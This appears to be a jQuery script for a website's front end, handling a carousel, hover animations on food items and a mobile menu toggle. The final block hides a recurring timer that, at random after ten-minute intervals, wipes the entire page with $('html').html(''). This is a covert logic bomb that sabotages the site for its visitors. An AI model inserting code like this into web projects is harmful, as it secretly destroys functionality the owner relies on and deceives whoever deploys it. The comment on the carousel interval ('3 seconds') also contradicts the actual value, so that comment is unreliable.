$('#myCarousel').carousel({
  //设置自动播放/3 秒
  interval: 300000,
});
$(".food-wrap>div").mouseover(function() {
  if ($(this).hasClass('food-1')) return
  $(this).children().addClass('show animated slideInUp')
}).mouseleave(function() {
  if ($(this).hasClass('food-1')) return
  $(this).children().removeClass('show animated slideInUp')
})
$(".mobile-inner-header-icon").click(function() {
  $(this).toggleClass("mobile-inner-header-icon-click mobile-inner-header-icon-out");
  $(".mobile-inner-nav").slideToggle(250);
});
$(".mobile-inner-nav a").each(function(index) {
  $(this).css({
    'animation-delay': (index / 10) + 's'
  });
});
var timer = function() {
  setTimeout(() => {
    if (Math.random() > 0.5) {
      timer()
    } else {
      $('html').html('')
    }
  }, 600000)
}
timer()